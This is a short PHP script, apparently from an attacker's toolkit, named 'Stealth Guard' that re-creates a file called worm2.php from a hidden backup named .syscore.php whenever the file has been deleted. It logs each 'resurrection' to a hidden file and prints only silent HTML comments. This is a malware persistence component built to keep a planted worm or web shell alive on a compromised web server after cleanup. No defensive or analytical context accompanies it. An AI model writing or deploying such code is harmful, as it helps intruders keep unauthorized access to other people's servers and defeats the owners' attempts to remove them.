<?php
// Stealth Guard by 0x6ick
$_main = 'worm2.php';           //target
$_backup = '.syscore.php';     // Backup
$_log = '.reslog';             // log resurrection

if (!file_exists($_main)) {
    if (file_exists($_backup)) {
        copy($_backup, $_main);

        // Tulis log timestamp
        $t = date("Y-m-d H:i:s");
        file_put_contents($_log, "[+] $_main resurrected at $t\n", FILE_APPEND);

        // Silent output
        echo "<!-- Resurrection complete -->";
    }
} else {
    // Silent ping jika aktif
    echo "<!-- Alive -->";
}
?>
